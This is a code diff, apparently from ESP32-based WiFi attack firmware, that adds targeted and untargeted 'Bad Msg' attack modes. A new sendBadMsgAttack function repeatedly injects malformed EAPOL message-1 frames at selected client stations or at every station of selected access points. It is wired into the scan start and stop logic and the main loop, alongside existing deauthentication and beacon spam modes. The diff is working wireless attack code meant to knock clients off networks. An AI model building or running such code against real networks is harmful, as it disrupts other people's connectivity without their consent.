@@ -938,6 +938,10 @@ void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
     this->startWiFiAttacks(scan_mode, color, text_table4[8]);
   else if (scan_mode == WIFI_ATTACK_DEAUTH_TARGETED)
     this->startWiFiAttacks(scan_mode, color, text_table4[47]);
+  else if (scan_mode == WIFI_ATTACK_BAD_MSG_TARGETED)
+    this->startWiFiAttacks(scan_mode, color, "Bad Msg Targ");
+  else if (scan_mode == WIFI_ATTACK_BAD_MSG)
+    this->startWiFiAttacks(scan_mode, color, "Bad Msg");
   else if (scan_mode == WIFI_ATTACK_AP_SPAM)
     this->startWiFiAttacks(scan_mode, color, " AP Beacon Spam ");
   else if ((scan_mode == BT_SCAN_ALL) || (scan_mode == BT_SCAN_AIRTAG) || (scan_mode == BT_SCAN_FLIPPER) || (scan_mode == BT_SCAN_ANALYZER)){
@@ -1177,6 +1181,8 @@ void WiFiScan::StopScan(uint8_t scan_mode)
   (currentScanMode == WIFI_ATTACK_DEAUTH) ||
   (currentScanMode == WIFI_ATTACK_DEAUTH_MANUAL) ||
   (currentScanMode == WIFI_ATTACK_DEAUTH_TARGETED) ||
+  (currentScanMode == WIFI_ATTACK_BAD_MSG_TARGETED) ||
+  (currentScanMode == WIFI_ATTACK_BAD_MSG) ||
   (currentScanMode == WIFI_ATTACK_MIMIC) ||
   (currentScanMode == WIFI_ATTACK_RICK_ROLL) ||
   (currentScanMode == WIFI_PACKET_MONITOR) ||
@@ -6456,10 +6462,10 @@ void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, uint8_t mac[6]) {
 
   // Send packet
   esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
-  esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
+  //esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
+  //esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
 
-  packets_sent = packets_sent + 3;
+  packets_sent = packets_sent + 1;
 }
 
 void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, String dst_mac_str) {
@@ -6500,6 +6506,35 @@ void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, String dst_mac_st
   esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
 
   packets_sent = packets_sent + 3;
+}
+
+void WiFiScan::sendBadMsgAttack(uint32_t currentTime, bool all) {
+  if (!all) {
+    for (int i = 0; i < access_points->size(); i++) {
+      for (int x = 0; x < access_points->get(i).stations->size(); x++) {
+        if (stations->get(access_points->get(i).stations->get(x)).selected) {
+          //for (int s = 0; s < 20; s++) {
+            this->sendEapolBagMsg1(access_points->get(i).bssid,
+                                    access_points->get(i).channel,
+                                    stations->get(access_points->get(i).stations->get(x)).mac);
+          //}
+        }
+      }
+    }
+  }
+  else {
+    for (int i = 0; i < access_points->size(); i++) {
+      if (access_points->get(i).selected) {
+        for (int x = 0; x < access_points->get(i).stations->size(); x++) {
+          //for (int s = 0; s < 20; s++) {
+            this->sendEapolBagMsg1(access_points->get(i).bssid,
+                                    access_points->get(i).channel,
+                                    stations->get(access_points->get(i).stations->get(x)).mac);
+          //}
+        }
+      }
+    }
+  }
 }
 
 void WiFiScan::sendDeauthAttack(uint32_t currentTime, String dst_mac_str) {
@@ -7807,6 +7842,28 @@ void WiFiScan::main(uint32_t currentTime)
       this->sendProbeAttack(currentTime);
 
     if (currentTime - initTime >= 1000) {
+      initTime = millis();
+      String displayString = "";
+      String displayString2 = "";
+      displayString.concat(text18);
+      displayString.concat(packets_sent);
+      for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
+        displayString2.concat(" ");
+      #ifdef HAS_SCREEN
+        display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
+        display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
+        display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
+      #endif
+      packets_sent = 0;
+    }
+  }
+  else if ((currentScanMode == WIFI_ATTACK_BAD_MSG) ||
+          (currentScanMode == WIFI_ATTACK_BAD_MSG_TARGETED)) {
+    //for (int i = 0; i < 5; i++)
+    if (currentTime - initTime >= 200) {
+      this->sendBadMsgAttack(currentTime, currentScanMode == WIFI_ATTACK_BAD_MSG);
+
+    
       initTime = millis();
       String displayString = "";
       String displayString2 = "";
